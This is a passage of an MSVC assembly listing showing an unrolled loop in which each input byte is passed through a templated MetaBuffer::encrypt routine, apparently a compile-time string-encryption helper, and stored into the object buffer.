  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
